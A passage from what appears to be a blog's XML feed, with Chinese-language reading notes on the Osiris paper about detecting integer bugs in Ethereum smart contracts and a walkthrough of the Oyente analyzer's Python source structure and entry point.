或 Web3-Provider.</p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Osiris 论文阅读笔记</title>
      <link href="/blog/2021/04/10/blockchain/eth_vulns/paper_osiris/"/>
      <url>/blog/2021/04/10/blockchain/eth_vulns/paper_osiris/</url>
      
        <content type="html"><![CDATA[<h2 id="background-and-contribution">Background and Contribution</h2><h3 id="background">Background</h3><ol type="1"><li>智能合约盛行，然而其漏洞很多，财产损失严重</li><li>The prevalence of integer bugs in smart contracts. <ahref="https://dasp.co/#item-3">2018 年位居 top3</a></li></ol><h3 id="contribution">Contribution</h3><p>Osiris</p><ol type="1"><li>a symbolic execution tool / a framework combines symbolic executionand taint analysis</li><li>auto-matically detects integer bugs in EVM bytecode</li><li>The tool currently covers <strong>three different types of integerbugs</strong>: arithmetic bugs, truncation bugs and signednessbugs.</li></ol><p>Advantages:</p><ol type="1"><li><p>Compared with Zeus, Osiris detects <strong>morevulnerabilities</strong>, with <strong>more confidence</strong>, as thefalse positives rate is considerably lower with our tool.</p></li><li><p>Osiris detects a <strong>greater range of bugs</strong> thanexisting tools，even discovered <strong>unknownvulnerabilities</strong>.</p></li><li><p>论文还对 EVM 和 solidity 编译器提出修改建议，来避免 integerbugs.</p></li></ol><h2 id="integer-bugs-introduction">integer bugs introduction</h2><ol type="1"><li>arithmetic bugs<ol type="1"><li>integer overflows</li><li>underflows</li><li>division by zero</li><li>modulo zero,</li></ol></li><li>truncation bugs 大范围 int -&gt; 小范围 int 的转换 Converting avalue of one integral type to a narrower integral type which has ashorter range of values may introduce so-called truncation bugs.</li><li>signedness bugs 有符号 &lt;-&gt; 无符号 可能会导致 负值 &lt;-&gt;大的正值.</li></ol><p>how to detect integer bugs contained in these contracts</p><p>见论文 p3：2.3 Integer Bugs in Ethereum Smart Contracts</p><h2 id="methodology">Methodology</h2><p>方法论，如何检测 integer bugs</p><p>Detect integer bugs at the bytecode level</p><ol type="1"><li>inferring integer types</li><li>detecting integer bugs</li><li>applying taint analysis to reduce false positives.</li></ol><p>other challenges such as identifying intended checks for integerbugs.</p><ol type="1"><li><p>Type Inference</p><p>Type information is usually only available at the source code leveland not at the bytecode level.</p><p>Due to certain code optimisations introduced by the Solidity compilerduring compile time, it is actually <strong>possible</strong> to inferthe size and the sign of integers at the bytecode level.</p><p>然后讲了根据那些特定的代码等来推测 size 和 sign</p></li><li><p>Finding Integer Bugs 分别从三种类型来讲述如何寻找。 见论文 p4 3.2Finding Integer Bugs</p></li><li><p>Taint Analysis 降低假阳率 Taint analysis can help to distinguishbetween benign(良性的) overflows introduced by the developer orcompiler, and malicious overflows that are exploitable by anattacker.</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200507180404.png"alt="taint analysis" /><figcaption aria-hidden="true">taint analysis</figcaption></figure><p>Therefore, by deliberately ignoring integer bugs that do notoriginate from a source and do not flow into a sink, we can focusexclusively on actual exploitable integer bugs and gracefully reduce thenumber of false positives</p><p>然后讲了常见可以作为 sources 或 sinks对应的指令们，并收集适当选取他们，以便后面判断使用</p></li><li><p>Identifying Benign Integer Bugs尽管污点分析已经减低了一些假阳率。 there are still some cases where aninteger bug might originate from an untrusted source and "ow into asensitive sink, while being a benign integer bug.</p><p>In order to cope with such cases, we came up with some heuristicrules. 并讲述了启发式规则。</p></li></ol><h2 id="osiris">OSIRIS</h2><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/2020561588765275347.png"alt="Architecture of ORISIS" /><figcaption aria-hidden="true">Architecture of ORISIS</figcaption></figure><p>We implemented Osiris on top of Oyente’s symbolic executionengine.</p><h3 id="design-overview">Design Overview</h3><p><strong>Input</strong>: the bytecode or Solidity source code of asmart contract. <strong>The latter gets internally compiled to EVMbytecode</strong> <strong>Output</strong>: whether a contract containsany integer bug (e.g. overflow, underflow, truncation, etc.)</p><p><strong>Three main components</strong>: symbolic analysis, taintanalysis and integer error detection</p><ol type="1"><li><p>Symbolic Analysis The symbolic analysis component<strong>constructs</strong> a Control Flow Graph (CFG) and symbolically<strong>executes</strong> the different paths of the contract. Thesymbolic analysis component passes the result of every executedinstruction to the taint analysis component as well as to the integererror detection component.</p><ol type="1"><li>The symbolic analysis component starts by constructing a CFG fromthe bytecode. Osiris can output a visual representation of the CFGdepicting the individual path conditions and highlighting the basicblocks that include integer bugs.</li><li>After constructing the CFG, the symbolic execution engine starts byexecuting the entry node of the CFG.</li></ol></li><li><p>Taint Analysis The taint analysis component <strong>introduces,propagates and checks</strong> for taint <strong>across stack, memoryand storage.</strong></p><ol type="1"><li><p>The symbolic execution engine forwards every executed instructionto the taint analysis component.</p></li><li><p>The taint analysis component checks wether the executedinstruction is part of the list of defined sources</p><ol type="1"><li><p>If that is the case, the taint analysis component introducestaint by tagging the affected stack, memory or storage location</p></li><li><p>Identifies the <strong>operands</strong> of each EVM bytecodeinstruction and propagates the taint according to the semantics of eachinstruction as defined in [38]</p></li><li><p>The following principle: if an instruction uses a tainted valueto derive another value, then the derived value becomes tainted as well通过遵循此污点传播原则，该工具实现了比 Mythrill 更精确的传播 Mythrilpropagates taint across the stack, but for certain instructions it doesnot propagate taint across memory or storage.</p></li><li><p>The taint analysis component verifies if a taint flow occurred,by</p><ol type="1"><li>checking whether the executed instruction is part of the list ofdefined sinks</li><li>if any of the values it used has been tainted by an integerbug.</li></ol></li></ol></li></ol></li><li><p>Integer Error Detection The integer error detection componentchecks whether an integer bug is possible within the executedinstruction.</p><p>The integer error detection component is only called at instructionsthat may result in integer bugs, such as arithmetic instructions. Callsto the integer error detection component are only performed if at leastone of the operands of the executed instruction is tainted. If thesecriteria are met, then the symbolic execution engine eventually forwards<strong>the executed instruction along with the current pathconditions</strong> to the integer error detection component.</p><p>the component follows the different techniques as described inSection 3.2 in order to detect the specific integer bugs.</p><p>见论文 p7 Integer Error Detection 的 For Example</p><ol type="1"><li>对于可能存在某种 integer bugs 的指令，Symbolic Analysis component调用 Integer Error Detection 中对应的方法进行检测</li><li>creates a formula with a constraint that is only feasible if aninteger overflow is possible <strong>under the current pathconditions</strong>.</li><li>pass the formula to the Z3 solver which checks for itsfeasibility</li><li>If the solver finds a solution to the formula, then <strong>theinteger error detection component</strong> knows that an integeroverflow is possible and returns an error back to <strong>the symbolicanalysis component</strong></li><li>The symbolic analysis component calls the taint analysis component,which then taints the result of the AND instruction where its sourcerepresents the discovered integer bug.</li></ol></li></ol><h2 id="evaluation">EVALUATION</h2><ol type="1"><li>Via the qualitative analysis we aim to determine the reliability ofour tool by comparing our results with Zeus</li><li>Via the quantitative analysis we intend to demonstrate thescalability of Osiris</li></ol><h3 id="qalitative-analysis">Qalitative Analysis</h3><p>重用了 Zeus 的数据集，并与 Zeus 对比。 结论： 1. Zeus 缺点 1. Zeus并不是像它论文上声称的那样 0 假阴率(有 bug 的报告为 无 bug 的) 2. Zeus并不能检测那些良性的 integer bugs (were induced by the developer or bythe Solidity compiler as part of handling data structures of dynamicsize such as arrays, strings or bytes.)，即: 错误地将其识别为 bugs 3.Zeus does not check for division by zero or modulo zero bugs 2. 也有一些Zeus 检测出来，而 Osiris 没有检测出来，但是那只是因为 Osiris 的 sources检测列表里面没有，加上就行了。 3. 在本次测试中，Orisi 的 false negativerate 比 ZEUS 低 88%（28/32）</p><h3 id="qantitative-analysis">Qantitative Analysis</h3><p>从公开的以太坊区块链上收集了 1,207,335, 其中 only 50,535 are uniquein terms of their bytecode.</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200507183547.png"alt="20200507183547" /><figcaption aria-hidden="true">20200507183547</figcaption></figure><h2 id="detection-of-real-world-vulnerabilities">Detection of Real-WorldVulnerabilities</h2><h3 id="detecting-known-vulnerabilities">Detecting KnownVulnerabilities</h3><p>CVE 们，都成功检测出来了</p><h3 id="detecting-unknown-vulnerabilities">Detecting UnknownVulnerabilities</h3><p>DataSet: Etherscan provides a list of top tokens ranked by theirmarket capitalisation We downloaded the bytecode as well as the sourcecode for these 495 smart contracts and analysed them using Osiris.</p><p>We found two overflows to be false positives</p><h2 id="不足与改进">不足与改进</h2><p>见论文 p12</p><ol type="1"><li><p>plan to extend Osiris’s taint analysis to also track taint acrossmultiple contracts (inter-contract analysis) and <strong>acrossdifferent method invocations</strong> (trace analysis).</p></li><li><p>aim to switch to <strong>concolic execution</strong> usingconcrete values from the blockchain in order to validate and generatedirect exploits. This may help us make Osiris’s detection mechanism<strong>even more precise</strong>.</p></li><li><p>want to <strong>augment our evaluation on the security ofEthereum tokens</strong>.</p></li></ol><p><ahref="https://link.springer.com/chapter/10.1007/978-3-540-78800-3_24">Z3:An Efficient SMT Solver</a></p>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Oyente 源码阅读笔记</title>
      <link href="/blog/2021/04/05/blockchain/eth_vulns/oyente_intro/"/>
      <url>/blog/2021/04/05/blockchain/eth_vulns/oyente_intro/</url>
      
        <content type="html"><![CDATA[<h1 id="oyente-源码阅读笔记">Oyente 源码阅读笔记</h1><h2 id="大致文件结构">大致文件结构</h2><p>首先，通过 <code>tree -L 2</code> 查看大致 2 层文件结构：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── code.md</span><br><span class="line">├── CONTRIBUTING.md</span><br><span class="line">├── Dockerfile</span><br><span class="line">├── LICENSE</span><br><span class="line">├── misc_utils</span><br><span class="line">│   ├── generate-graphs.py</span><br><span class="line">│   ├── get_source.py</span><br><span class="line">│   ├── stats-collect.py</span><br><span class="line">│   ├── transaction_scrape 2.py</span><br><span class="line">│   ├── transaction_scrape.py</span><br><span class="line">│   └── tx-stats.py</span><br><span class="line">├── oyente</span><br><span class="line">│   ├── analysis.py</span><br><span class="line">│   ├── ast_helper.py</span><br><span class="line">│   ├── ast_walker.py</span><br><span class="line">│   ├── basicblock.py</span><br><span class="line">│   ├── batch_run.py</span><br><span class="line">│   ├── ethereum_data1.py</span><br><span class="line">│   ├── ethereum_data.py</span><br><span class="line">│   ├── global_params.py</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── input_helper.py</span><br><span class="line">│   ├── opcodes.py</span><br><span class="line">│   ├── oyente.py</span><br><span class="line">│   ├── run_tests.py</span><br><span class="line">│   ├── source_map.py</span><br><span class="line">│   ├── state.json</span><br><span class="line">│   ├── symExec.py</span><br><span class="line">│   ├── test_evm</span><br><span class="line">│   ├── utils.py</span><br><span class="line">│   ├── vargenerator.py</span><br><span class="line">│   └── vulnerability.py</span><br><span class="line">├── pylintrc</span><br><span class="line">├── README.md</span><br><span class="line">├── setup.py</span><br><span class="line">├── sol_examples</span><br><span class="line">│   ├── BECToken.sol</span><br><span class="line">│   ├── calls.sol</span><br><span class="line">│   ├── etherstore.sol</span><br><span class="line">│   ├── exceptions.sol</span><br><span class="line">│   ├── hashforether.sol</span><br><span class="line">│   ├── origin.sol</span><br><span class="line">│   ├── returnvalue.sol</span><br><span class="line">│   ├── rubixi.sol</span><br><span class="line">│   ├── suicide.sol</span><br><span class="line">│   ├── timelock.sol</span><br><span class="line">│   ├── token.sol</span><br><span class="line">│   ├── WalletLibrary.sol</span><br><span class="line">│   └── weak_random.sol</span><br><span class="line">└── web</span><br><span class="line">    ├── app</span><br><span class="line">    ├── bin</span><br><span class="line">    ├── browser-solidity</span><br><span class="line">    ├── config</span><br><span class="line">    ├── config.ru</span><br><span class="line">    ├── db</span><br><span class="line">    ├── Gemfile</span><br><span class="line">    ├── Gemfile.lock</span><br><span class="line">    ├── lib</span><br><span class="line">    ├── log</span><br><span class="line">    ├── package.json</span><br><span class="line">    ├── public</span><br><span class="line">    ├── Rakefile</span><br><span class="line">    ├── README.md</span><br><span class="line">    ├── test</span><br><span class="line">    ├── vendor</span><br><span class="line">    └── yarn.lock</span><br><span class="line"></span><br><span class="line">15 directories, 52 files</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="level-one">Level One</h3><p>几个关键些的文件（夹）：</p><p><code>README.md</code> ：我们在 Github 下载的时候已经看了，讲解docker 或者依赖安装等 <code>code.md</code>：中讲述了本项目的大致代码结构，可以先看一遍，然后看代码的时候对照着看。<code>setup.py</code> : setuptools 的构建脚本，用来告诉 setuptools关于本项目（包）的描述、入口点、数据、包含的模块等，可以看一遍了解项目概况。关于<code>setup.py</code> 的详细信息，见 Packaging Python Projects <ahref="#fn1" class="footnote-ref" id="fnref1"role="doc-noteref"><sup>1</sup></a> <code>misc_utils 文件夹</code> :杂项，放了一些对本项目实用的工具脚本 <code>oyente 文件夹</code> ：项目的主要源码文件夹</p><p><code>sol_examples 文件夹</code> : 是我在 <ahref="https://github.com/ConsenSys/mythril/tree/develop/solidity_examples">Mythril的 github 仓库</a> 下载的，便于测试使用（如果可以的话）。</p><h3 id="level-two">Level Two</h3><h4 id="oyente.oyentemain">oyente.oyente:main</h4><p>入口点： oyente 文件夹中 <code>oyente.py</code> 的 main() 函数</p><ol start="0" type="1"><li><p>声明 args 全局变量</p><p>后面在 analyze_bytecode 等函数中会用到输入参数们 args。</p><p>这里编码不规范，应该在所有函数外声明全局变量，虽然可以在函数内创建全局变量，但是不推荐，<ahref="#fn2" class="footnote-ref" id="fnref2"role="doc-noteref"><sup>2</sup></a></p></li><li><p>通过 argparse 模块设置参数</p><ul><li>只需要 True 或者 False 的选项，使用了 argparse 的 action 参数<ahref="#fn3" class="footnote-ref" id="fnref3"role="doc-noteref"><sup>3</sup></a></li></ul><p>比如：args.source、args.evm、args.standard_json等输入输出类型、过程配置相关参数</p><ul><li><p>dest 参数明确指定参数属性名<a href="#fn4" class="footnote-ref"id="fnref4" role="doc-noteref"><sup>4</sup></a></p></li><li><p>nargs 对一个 action 绑定多个参数，其值为 “+” 时，把该 action所有参数 gathered into a list <a href="#fn5" class="footnote-ref"id="fnref5" role="doc-noteref"><sup>5</sup></a></p></li></ul><ol type="1"><li><p>输入</p><p>接受三种输入：solidity program、evm bytecode、remote contracts这里，它使用 <code>add_mutually_exclusive_group(require=True)</code>互斥参数组来确保将互斥组中只有一个参数在命令行中可用，且至少有一个。具体输入类型: | 类型| 本地 | 远程 URL| |-------|----|-------| | solidity| -s filename | -ru url_address| | 字节码 | -b -s filename | -b -ruurl_address|</p><p>solidity 源码，还可以指定输入为标准 json 格式。</p></li><li><p>程序运行配置相关</p><p>如：指定运行 <strong>solidity 源码</strong>中的某（几）个合约target-contract、并行 parallel、debug 等</p></li><li><p>运行过程中相关 IO 处理、操作相关</p><p>如，输出报错，创建报告等</p></li><li><p>检测运行相关</p><p>如：Gas、loop、depth 的限制、路径等</p></li></ol></li><li><p>根据输入的参数和预先设置 0. 如果为本地文件（.sol 或 .evm），通过-s 选项，获取到 args.source 的值</p><ol type="1"><li>进行全局参数、日志配置</li><li>确保指定检测某个合约的功能，只能在源码输入情况下进行。</li><li><code>has_dependencies_installed</code> 判断依赖（<code>z3、evm、solc</code> ）是否安装，并通过<code>compare_versions</code>函数比较版本是否为测试版本(及以下)，如不满足，则提示、并退出程序。</li><li>如果是远程 URL，则创建 remote_contract.sol 或remote_contract.evm，并使用 requests 模块写入,然后设置 args.source为文件名</li><li>检测字节码 <code>analyze_solidity</code> 或者源码<code>analyze_solidity</code></li><li>检测完毕，退出 <code>exit_code</code></li></ol></li></ol><h4id="oyente.oyentehas_dependencies_installed">oyente.oyente:has_dependencies_installed</h4><p>本函数判断依赖是否安装、且版本是否为测试版本(及以下), 版本要求：<code>z3 &lt;= 4.5.1</code> 、 <code>evm &lt;= 1.7.3</code> 、<code>solc &lt;= 0.4.19</code> ，否则退出程序</p><p>几个注意的点：</p><ol type="1"><li><p>Python 运行终端命令， <code>type cmd</code> 判断命令是否存在</p><ol type="1"><li>cmd_exist 开启一个子进程在 shell 中执行 <code>type cmd</code>命令来判断是否存在</li></ol><p>为什么要使用子进程测试呢？ 属于 ”Python 中调用 Linux命令并获取返回值“ 知识范畴<a href="#fn6" class="footnote-ref"id="fnref6" role="doc-noteref"><sup>6</sup></a> 结论：如果要兼容 python3.5 以下就用 subprocess.call，反之，用 subprocess.run<a href="#fn7"class="footnote-ref" id="fnref7"role="doc-noteref"><sup>7</sup></a></p></li><li><p>获得版本</p></li><li><p>比较版本 <a href="#fn8" class="footnote-ref" id="fnref8"role="doc-noteref"><sup>8</sup></a></p><p>通过 <code>compare_versions</code> 函数，使用 pypthon2 的 cmp比较，但是还通过 six 模块判断，在比较时，对 python3 做了兼容，</p><ul class="task-list"><li><label><inputtype="checkbox" />这里的比较函数需要区分小于等于和大于，可以直接改用<code>&lt;=</code> ,然后把调用该函数那儿的判断改一下。</label></li></ul><p>python 中直接使用 <code>&lt;、&gt;、==、&gt;=</code>等进行比较即可</p><p>为什么要比较小于等于？ 版本的向后兼容性(Backward Compatibility)<ahref="#fn9" class="footnote-ref" id="fnref9"role="doc-noteref"><sup>9</sup></a></p><p>不过，有的 urllib2 等又没有对 python2 做兼容，真是奇怪。我们直接上python3，不用兼容 python2，它都要被淘汰了。</p></li><li><p>判断 z3 依赖的方法</p><p>它采用捕获 import 异常的方法以及获取版本函数的方式</p><p>在我的 linux 上，z3 也可以通过 <code>type z3</code>判断存在与否，通过 <code>z3 --version</code>来获取版本，即：和其他两个依赖方法一直。 但是我的 Ubuntu server上貌似不行，后面看看你们可不可以，如果可以，那这里用函数把三者统一一下。</p><ul class="task-list"><li><label><inputtype="checkbox" />这里可以优化一下，把三个依赖是否存在的判断方法写成一个函数。</label></li></ul></li></ol><p>判断命令是否存在，一般有 type、hash、python 捕获导入异常<ahref="#fn10" class="footnote-ref" id="fnref10"role="doc-noteref"><sup>10</sup></a> <a href="#fn11"class="footnote-ref" id="fnref11"role="doc-noteref"><sup>11</sup></a></p><h4id="oyente.oyenteanalyze_bytecode">oyente.oyente:analyze_bytecode</h4><ol type="1"><li><p>创建 Input_Helper 类的对象</p><p>类对象的初始化操作主要工作 确定要检测的文件类型与位置设置默认参数，并获取一些配置参数</p><ol type="1"><li><p>并根据输入类型：字节码设置一些默认属性</p><p>传入 InputHelper.BYTECODE共有类属性[^class_attr]，来说明输入为字节码</p></li><li><p>遍历字典项：属性</p><p>使用 six.iteritems 遍历字典，做了 python2/3 的兼容<a href="#fn12"class="footnote-ref" id="fnref12"role="doc-noteref"><sup>12</sup></a>，这里再说一句，本项目没有全部兼容处理，有问题。。通过字典的 指定 default 参数的 get 方法获取属性<a href="#fn13"class="footnote-ref" id="fnref13" role="doc-noteref"><sup>13</sup></a>使用 setattr 实现在循环中，设置任意属性名和任意属性值<a href="#fn14"class="footnote-ref" id="fnref14"role="doc-noteref"><sup>14</sup></a></p></li></ol></li><li><p>调用 helper 对象的 get_inputs()获取返回列表的第一项，其内容为：反汇编结果的文件名</p><ol type="1"><li><p>对于指定检测 solidity 源码文件中的某几个合约的，get_inputs采用了默认参数</p><p>了解一下，可变参数（这里的话，就是 list）的默认参数需要设置为 None <ahref="#fn15" class="footnote-ref" id="fnref15"role="doc-noteref"><sup>15</sup></a></p></li><li><p>对于字节码，它根据 args.source 中的文件名读取内容到 bytecode变量</p></li><li><p>将 bytecode 传递给自身的私有方法<code>_prepare_disasm_file</code></p></li><li><p>_prepare_disasm_file 处理字节码，并生成反汇编文件</p><ol type="1"><li><p>通过 _write_evm_file 进行去 SwarmHash 处理<a href="#fn16"class="footnote-ref" id="fnref16"role="doc-noteref"><sup>16</sup></a>,然后写入到<code>f"&#123;args.source&#125;.evm"</code> 文件中</p><p>去除它的原因：swarm hash in bytecode can be misinterpreted as INVALIDopcode</p><p>SwarmHash/Swarm 是一个点对点文件共享系统，设计用来有效地存储和检索ethereum 应用程序和合约中所需的数据。 最简单的类比应该是：Swarm 本质上是ether 的 BitTorrent。 solc 编译后的字节码里面有个 CBOR元数据编码，它里面就有 SwarmHash。SwarmHash以固定的串开头，以固定的串结尾。</p><ul class="task-list"><li><label><input type="checkbox" />不同版本（们？）之间的 SwarmHash的开头和结尾的固定部分好像有所变化，需要仔细调研一下。</label></li></ul></li><li><p>通过 _write_disasm_file 读取上一步处理好的 <code>.evm</code>，然后反汇编，并写入到 <code>f"&#123;args.source&#125;.evm.disasm"</code>文件中</p><ol type="1"><li><p>读取上一步处理完的字节码到 <code>evm_file</code> 变量</p></li><li><p>开启一个子进程 subprocess，通过执行终端命令：<code>evm disasm evm_file</code> ，若反汇编失败则退出程序</p><p>这里使用了 popen<a href="#fn17" class="footnote-ref" id="fnref17"role="doc-noteref"><sup>17</sup></a> run 函数的底层，就是 Popen函数。run 函数是同步的，要等待子进程实行结束，或者超时。Popen创建子进程后，采用异步的方式，不会等待。Popen 比 run 要更加灵活，如果run 函数还不能满足你的需求，就考虑 Popen</p><ul class="task-list"><li><label><input type="checkbox" />run 和 popen 选择？</label></li></ul></li><li><p>将反汇编结果写入<code>f"&#123;args.source&#125;.evm.disasm"</code></p></li></ol></li></ol></li><li><p>然后将反汇编结果文件名作<code>&#123;'disasm_file': disasm_file&#125;</code> 字典，附加到 inputs列表中并返回</p><ul class="task-list"><li><label><inputtype="checkbox" />不知道这里要用列表，不就是一个字典元素</label></li></ul></li></ol></li><li><p>将反汇编的文件名传入 symExec.run()开始符号执行，检测漏洞，并返回结果和退出码</p></li><li><p>删除临时文件</p><p>包括之前生成的“处理过的字节码文件”，“反汇编结果文件”，还有日志等。</p></li><li><p>如果是全局参数 WEB 设置了，使用 six.print_ 输出一下 json格式的结果。</p></li><li><p>返回退出码</p></li></ol><h2 id="目前发现的缺点">目前发现的缺点</h2><ol type="1"><li><p>在函数内使用 global <strong>创建</strong>全局变量苏安然可以这样用，但是貌似不推荐？</p></li><li><p>python2 与 python3 兼容性没做好 虽然使用了 six模块，但是只用其处理了 print，没处理好比较、urllib2 等，还是不能兼容python2 和 python3</p></li><li><p>模块化不彻底，不同功能之间有点混乱。感觉相互之间交叉，功能有点混乱，也可能是我看源码的能力不够？</p></li><li><p>动态为对象添加属性 不太方便看，不知道规不规范?</p></li><li><p>获取判断依赖那里没准可以统一用函数？</p></li></ol><h2 id="参考资料">参考资料</h2><ol start="0" type="1"><li><ahref="https://unix.stackexchange.com/questions/22494/copy-file-to-xclip-and-paste-to-firefox">Copyfile to xclip and paste to Firefox</a></li></ol><p>[^class_attr]：<ahref="https://www.python-course.eu/python3_class_and_instance_attributes.php#:~:text=Class%20attributes%20are%20attributes%20which,%20right%20below%20the%20class%20header.">Classand Instance Attributes</a> <ahref="https://blog.csdn.net/qq_31780525/article/details/72639491">Python中的类属性、实例属性与类方法、静态方法</a></p><aside id="footnotes" class="footnotes footnotes-end-of-document"role="doc-endnotes"><hr /><ol><li id="fn1"><p><ahref="https://packaging.python.org/tutorials/packaging-projects/">PackagingPython Projects</a><a href="#fnref1" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn2"><p><ahref="https://stackoverflow.com/questions/4693120/use-of-global-keyword-in-python">Useof “global” keyword in Python</a> <ahref="https://www.geeksforgeeks.org/global-keyword-in-python/">Globalkeyword in Python</a><a href="#fnref2" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn3"><p><ahref="https://docs.python.org/3/library/argparse.html#action">py3_doc_argpasre_action</a><ahref="#fnref3" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn4"><p><ahref="https://docs.python.org/3/library/argparse.html#dest">py3_doc_argpasre_dest</a><ahref="#fnref4" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn5"><p><ahref="https://docs.python.org/3/library/argparse.html#nargs">py3_doc_argpasre_nargs</a><ahref="#fnref5" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn6"><p><ahref="https://www.cnblogs.com/mianbaoshu/p/12024498.html">Python 中调用Linux 命令并获取返回值</a> <ahref="https://docs.python.org/3/library/os.html#os.system">os.system(command)</a><ahref="https://docs.python.org/3/library/subprocess.html#subprocess.run">Usingthe subprocess Module</a> <ahref="https://docs.python.org/3/library/subprocess.html#module-subprocess">Olderhigh-level API</a> <ahref="https://blog.csdn.net/bcfdsagbfcisbg/article/details/78180650">关于os.system 和 os.popen 的坑</a><a href="#fnref6" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn7"><p><a href="https://www.pynote.net/archives/490">subprocess模块教程</a><a href="#fnref7" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn8"><p><ahref="https://codegolf.stackexchange.com/questions/49778/how-can-i-use-cmpa-b-with-python3">Howcan I use cmp(a, b) with Python3?</a> <ahref="https://portingguide.readthedocs.io/en/latest/comparisons.html">Comparingand Sorting</a><a href="#fnref8" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn9"><p><ahref="https://zhuanlan.zhihu.com/p/28195702">向前兼容与向后兼容</a><ahref="#fnref9" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn10"><p><ahref="https://stackoverflow.com/questions/592620/how-can-i-check-if-a-program-exists-from-a-bash-script">Howcan I check if a program exists from a Bash script?</a> <ahref="https://www.jianshu.com/p/fbffa5cc49e1">Bash中如何判断一个命令是否存在</a><a href="#fnref10" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn11"><p><ahref="https://blog.csdn.net/longerzone/article/details/12948925">Linux下的两个特殊的文件 -- /dev/null 和 /dev/zero 简介及对比</a> <ahref="https://blog.csdn.net/sunboy_2050/article/details/9288353">LinuxShell 1&gt;/dev/null 2&gt;&amp;1 含义</a> <ahref="https://www.zhihu.com/question/53295083">shell 程序中 2&gt;/dev/null 代表什么意思？</a><a href="#fnref11" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn12"><p><ahref="https://six.readthedocs.io/#six.iteritems">six_iteritems</a><ahref="#fnref12" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn13"><p><ahref="https://www.runoob.com/python/att-dictionary-get.html">Python字典(Dictionary) get()方法</a> <ahref="https://www.runoob.com/python/python-func-setattr.html">Pythonsetattr() 函数</a> <ahref="https://blog.csdn.net/Ghost_leader/article/details/60145971?utm_source=blogxgwz4">python中的 setattr 的使用</a> <ahref="https://python3-cookbook.readthedocs.io/zh_CN/latest/c07/p05_define_functions_with_default_arguments.html">定义有默认参数的函数</a><ahref="#fnref13" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn14"><p><ahref="https://www.runoob.com/python/att-dictionary-get.html">Python字典(Dictionary) get()方法</a> <ahref="https://www.runoob.com/python/python-func-setattr.html">Pythonsetattr() 函数</a> <ahref="https://blog.csdn.net/Ghost_leader/article/details/60145971?utm_source=blogxgwz4">python中的 setattr 的使用</a> <ahref="https://python3-cookbook.readthedocs.io/zh_CN/latest/c07/p05_define_functions_with_default_arguments.html">定义有默认参数的函数</a><ahref="#fnref14" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn15"><p><ahref="https://www.runoob.com/python/att-dictionary-get.html">Python字典(Dictionary) get()方法</a> <ahref="https://www.runoob.com/python/python-func-setattr.html">Pythonsetattr() 函数</a> <ahref="https://blog.csdn.net/Ghost_leader/article/details/60145971?utm_source=blogxgwz4">python中的 setattr 的使用</a> <ahref="https://python3-cookbook.readthedocs.io/zh_CN/latest/c07/p05_define_functions_with_default_arguments.html">定义有默认参数的函数</a><ahref="#fnref15" class="footnote-back" role="doc-backlink">↩︎</a></p></li><li id="fn16"><p><ahref="https://www.one-tab.com/page/XHxD-FQcRxiUoyGZGQ8Gjw">OneTabShared: 9 tabs</a><a href="#fnref16" class="footnote-back"role="doc-backlink">↩︎</a></p></li><li id="fn17"><p><ahref="https://www.pynote.net/archives/490">subprocess 模块教程</a><ahref="#fnref17" class="footnote-back" role="doc-backlink">↩︎</a></p></li></ol></aside>]]></content>
      
      
      <categories>
          
          <category> blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>区块链入门介绍:从历史到原理</title>
      <link href="/blog/2021/03/30/blockchain/0.intro/"/>
      <url>/blog/2021/03/30/blockchain/0.intro/</url>
      
